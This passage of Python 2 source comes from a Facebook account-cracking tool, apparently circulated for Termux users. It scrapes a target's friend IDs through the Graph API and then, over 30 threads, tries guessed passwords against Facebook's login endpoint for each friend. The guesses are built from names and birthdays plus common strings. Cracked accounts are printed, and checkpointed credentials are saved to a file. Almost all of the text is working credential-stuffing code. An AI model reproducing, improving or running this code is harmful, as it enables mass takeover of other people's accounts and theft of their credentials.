				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'

				                                                                                                   cek = open("out/super_cp.txt", "a")

				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")

				                                                                                                   cek.close()

				                                                                                                   cekpoint.append(user+pass9)		

											                                       

																	

															

		except:

			pass

		

	p = ThreadPool(30)

	p.map(main, id)

	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mA7Ae AFRIDI\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

	print "  \033[1;91m«---•◈•--- MR NA--•◈•---»" #Dev:Mr A7A

	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'

	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))

	print """

  ______   _______   __      __  ______   __    __ 

 /      \ /       \ /  \    /  |/      \ /  \  /  |

/$$$$$$  |$$$$$$$  |$$  \  /$$//$$$$$$  |$$  \ $$ |

$$ |__$$ |$$ |__$$ | $$  \/$$/ $$ |__$$ |$$$  \$$ |

$$    $$ |$$    $$<   $$  $$/  $$    $$ |$$$$  $$ |

$$$$$$$$ |$$$$$$$  |   $$$$/   $$$$$$$$ |$$ $$ $$ |

$$ |  $$ |$$ |  $$ |    $$ |   $$ |  $$ |$$ |$$$$ |

$$ |  $$ |$$ |  $$ |    $$ |   $$ |  $$ |$$ | $$$ |

$$/   $$/ $$/   $$/     $$/    $$/   $$/ $$/   $$/ 

 

         Checkpoint ID Open After 7 Days

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.

: \033[1;91m ....MR NA....... \033[1;95m :

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 

                

              \033[1;91m +xxxxxxxxxxxx"""

	

	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")

	menu()

        

def hack():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."

        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;96mTelegram me @Hacker_Afridi."

        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;96mTelegram Chenal @TERMUX_LOVER."

	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"

	pilih_hack()

def pilih_hack():

	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")

	if peak =="":

		print "\x1b[1;91mFill in correctly"

		pilih_hack()

	elif peak =="1":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")

		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mNOOR AFRIDI\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]

		except KeyError:

			print"\x1b[1;91mID Not Found!"

			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")

			hack()

		print"\033[1;91mGetting IDs\033[1;97m..."

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

        elif peak =="2":

	        os.system('xdg-open https://m.me/DR.N00R.AFRIDI')

	        menu()

        elif peak =="3":

	        os.system('xdg-open https://m.me/DR.N00R.AFRIDI')

	        menu()

	elif peak =="0":

		menu()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih_hack()

	

	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))

	jalan('\033[1;91mPlease Wait\033[1;94m...')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)

	print "\n\033[1;91m«--•◈••◈•---\x1b[1;95m•◈•Stop Process Press CTRL+Z•◈•\033[1;91m---•◈••◈•-»"

	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mA7Ae MARG\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')

	print "\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mNOOR AFRIDI\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	

			

	def main(arg):

		global oks

		user = arg

		try:

			os.mkdir('out')

		except OSError:

			pass #Dev:love_hacker

		try:													

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												

			b = json.loads(a.text)												

			pass1 = b['first_name'] + '1234'												

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			q = json.load(data)												

			if 'access_token' in q:

				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				z = json.loads(x.text)

				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											

				oks.append(user+pass1)

                        else:

			        if 'www.facebook.com' in q["error_msg"]:

				    print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'

				    cek = open("out/super_cp.txt", "a")

				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")

				    cek.close()

				    cekpoint.append(user+pass1)

                                else:

				    pass2 = b['first_name'] + '123'										

                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			            q = json.load(data)												

			            if 'access_token' in q:	

				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				            z = json.loads(x.text)

				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											

				            oks.append(user+pass2)

                                    else:

			                   if 'www.facebook.com' in q["error_msg"]:

				               print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'

				               cek = open("out/super_cp.txt", "a")

				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")

				               cek.close()

				               cekpoint.append(user+pass2)								

				           else:											

					       pass3 = b['last_name']+'123'										

					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										

					       q = json.load(data)										

					       if 'access_token' in q:	

						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                       z = json.loads(x.text)

						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'								

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									

						       oks.append(user+pass3)

                                               else:

			                               if 'www.facebook.com' in q["error_msg"]:

				                           print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'

				                           cek = open("out/super_cp.txt", "a")

				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")

				                           cek.close()

				                           cekpoint.append(user+pass3)									

					               else:										

						           pass4 = b['first_name'] + '12345'											

			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                   q = json.load(data)												

			                                   if 'access_token' in q:		

						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                   z = json.loads(x.text)

				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											

				                                   oks.append(user+pass4)

                                                           else:

			                                           if 'www.facebook.com' in q["error_msg"]:

				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'

				                                       cek = open("out/super_cp.txt", "a")

				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")

				                                       cek.close()

				                                       cekpoint.append(user+pass4)					

					                           else:									

						                       pass5 = 'kontol123'							

						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								

						                       q = json.load(data)								

						                       if 'access_token' in q:	

						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                               z = json.loads(x.text)

						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'						

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							

						                               oks.append(user+pass5)	

                                                                       else:

			                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'

				                                                   cek = open("out/super_cp.txt", "a")

				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")

				                                                   cek.close()

				                                                   cekpoint.append(user+pass5)					

						                               else:								

							                           pass6 = 'sayang123'											

			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                           q = json.load(data)												

			                                                           if 'access_token' in q:	

								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                           z = json.loads(x.text)

				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											

				                                                           oks.append(user+pass6)

                                                                                   else:

			                                                                   if 'www.facebook.com' in q["error_msg"]:

				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'

				                                                               cek = open("out/super_cp.txt", "a")

				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")

				                                                               cek.close()

				                                                               cekpoint.append(user+pass6)	

						                                           else:							

								                               pass7 = b['first_name']+'123456'						

								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						

								                               q = json.load(data)						

								                               if 'access_token' in q:		

				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                       z = json.loads(x.text)

									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					

									                               oks.append(user+pass7)

                                                                                               else:

			                                                                               if 'www.facebook.com' in q["error_msg"]:

				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'

				                                                                           cek = open("out/super_cp.txt", "a")

				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")

				                                                                           cek.close()

				                                                                           cekpoint.append(user+pass7)           					

								                                       else:

                                                                                                           lahir = a['birthday']						

										                           pass8 = lahir.replace('/', '')											

			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                                                   q = json.load(data)												

			                                                                                   if 'access_token' in q:		

										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                   z = json.loads(x.text)

				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											

				                                                                                   oks.append(user+pass8)

                                                                                                           else:

			                                                                                           if 'www.facebook.com' in q["error_msg"]:

				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'

				                                                                                       cek = open("out/super_cp.txt", "a")

				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")

				                                                                                       cek.close()

				                                                                                       cekpoint.append(user+pass8)   	

										                                   else:					

										                                       pass9 = b['first_name'] + '1122'					

										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				

										                                       q = json.load(data)				

										                                       if 'access_token' in q:		

		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                               z = json.loads(x.text)

											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			

											                                       oks.append(user+pass9)

                                                                                                                       else:

			                                                                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'

				                                                                                                   cek = open("out/super_cp.txt", "a")

				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")

				                                                                                                   cek.close()

				                                                                                                   cekpoint.append(user+pass9)		

											                                       

																	

															

		except:

			pass

		

	p = ThreadPool(30)

	p.map(main, id)

	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mNOOR AFRIDI\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

	print "  \033[1;91m«---•◈•--- By MR A7A--•◈•---»" #Dev:Mr A7A

	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'

	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))

	print """

 ╔══╗───█──────────█▀────╔══╗

║─╔╬═╗─█▄─────────█▀──╔═╬╗─║

╚═╬╝╔╬═╗──█▀█─█─█─▀▀╔═╬╗╚╬═╝

──╚═╬╝╔╬═╗█▄█─▀▄▀─╔═╬╗╚╬═╝──

────╚═╬╝╔╬═╗────╔═╬╗╚╬═╝────

──────╚═╬╝╔╬═╗╔═╬╗╚╬═╝──────

────────╚═╬╝╔╬╬╗╚╬═╝────────

──────────╚═╬╝╚╬═╝──────────

────────────╚══╝────────────

         Checkpoint ID Open After 7 Days

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.

: \033[1;91m ....MR NA....... \033[1;95m :

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 

                

              \033[1;91m +xxxxxxxxx"x"""

	

	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")

	menu()

def black():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;97mClone Friend List Public ID."

        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;97mTelegram me @Hacker_Afridi."

        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;97mTelegram chanll @TERMUX_LOVER."

	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"

	pilih_black()

def pilih_black():

	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")

	if peak =="":

		print "\x1b[1;91mFill in correctly"

		pilih_black()

	elif peak =="1":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")

		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mNOOR AFRIDI\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]

		except KeyError:

			print"\x1b[1;91mID Not Found!"

			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")

			black()

		print"\033[1;91mGetting IDs\033[1;97m..."

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

        elif peak =="2":

	        os.system('xdg-open https://m.me/DR.N00R.AFRIDI')

	        menu()

        elif peak =="3":

	        os.system('xdg-open https://m.me/DR.N00R.AFRIDI')

	        menu()

	elif peak =="0":

		menu()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih_black()

	

	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))

	jalan('\033[1;91mPlease Wait\033[1;94m...')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)

	print "\n\033[1;91m«--•◈••◈•---\x1b[1;95m•◈•Stop Process Press CTRL+Z•◈•\033[1;91m---•◈••◈•-»"

	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mA7Ae AFRIDI\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')

	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mNOOR AFRIDI\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	

			

	def main(arg):

		global oks

		user = arg

		try:

			os.mkdir('out')

		except OSError:

			pass #Dev:love_hacker

		try:													

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												

			b = json.loads(a.text)												

			pass1 = b['first_name'] + '123'												

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			q = json.load(data)												

			if 'access_token' in q:

				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				z = json.loads(x.text)

				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											

				oks.append(user+pass1)

                        else:

			        if 'www.facebook.com' in q["error_msg"]:

				    print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'

				    cek = open("out/super_cp.txt", "a")

				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")

				    cek.close()

				    cekpoint.append(user+pass1)

                                else:

				    pass2 = b['first_name'] + 'david'										

                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			            q = json.load(data)												

			            if 'access_token' in q:	

				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				            z = json.loads(x.text)

				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											

				            oks.append(user+pass2)

                                    else:

			                   if 'www.facebook.com' in q["error_msg"]:

				               print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'

				               cek = open("out/super_cp.txt", "a")

				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")

				               cek.close()

				               cekpoint.append(user+pass2)								

				           else:											

					       pass3 = b['first_name']+'alex'										

